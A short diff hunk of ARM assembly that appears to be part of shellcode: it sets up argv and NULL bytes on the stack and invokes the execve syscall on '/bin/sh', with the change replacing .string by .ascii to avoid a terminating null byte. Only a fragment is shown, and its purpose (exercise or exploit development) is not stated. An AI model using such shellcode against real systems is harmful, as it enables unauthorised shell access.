@@ -16,4 +16,4 @@ add r3, pc, 4               ; r3 = address of argv on stack
 add r1, sp, 4               ; r1 = argv pointer
 strb r2, [r3, 1]            ; another NULL byte
 svc 0x900b0b                ; syscall execve (syscall 0xb)
-.string "/bin/sh"
+.ascii "/bin/sh"
